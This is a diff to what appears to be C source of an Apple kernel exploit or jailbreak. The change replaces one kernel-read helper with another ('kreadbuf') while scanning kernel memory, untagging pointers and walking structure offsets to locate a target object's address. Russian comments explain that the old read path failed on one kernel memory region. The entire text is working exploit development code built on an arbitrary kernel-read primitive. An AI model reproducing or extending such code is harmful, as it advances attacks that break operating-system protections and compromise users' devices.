@@ -5846,17 +5846,20 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
         for (uint32_t i = 0; i < eN && i < 8 && !rangesVA; i++) {
             uint8_t ebuf[0x2200];
             memset(ebuf, 0, sizeof(ebuf));
-            if (!kpRead(eptrs[i], ebuf, sizeof(ebuf), "ps entry full", r)) continue;
+            // 1.9.129: kpRead не транслирует регион op-записей (0xffffffdf…,
+            // kvtophys=0 — прогон 1.9.128). Читаем kreadbuf'ом — тот же путь,
+            // которым читаются proc'ы в этом регионе.
+            if (!kreadbuf(eptrs[i], ebuf, sizeof(ebuf))) continue;
             for (uint32_t eo = 0; eo + 8 <= sizeof(ebuf) && !rangesVA; eo += 8) {
                 uint64_t S = 0;
                 memcpy(&S, ebuf + eo, 8);
                 S = kp_untag_ptr(S);
                 if (S < 0xffffffdc00000000ULL || S >= 0xffffffe400000000ULL) continue;
                 uint64_t ro = 0, rq = 0;
-                if (!kpRead(S + 0x178, &ro, 8, "ps ro", r)) continue;
+                if (!kreadbuf(S + 0x178, &ro, 8)) continue;
                 ro = kp_untag_ptr(ro);
                 if (ro < 0xffffffdc00000000ULL || ro >= 0xffffffe400000000ULL) continue;
-                if (!kpRead(ro + 0x18, &rq, 8, "ps rq", r)) continue;
+                if (!kreadbuf(ro + 0x18, &rq, 8)) continue;
                 if ((uint32_t)(rq >> 32) != pfn32 || (uint32_t)rq != 1) continue;
                 surfVA = S;
                 rangesVA = ro + 0x18;
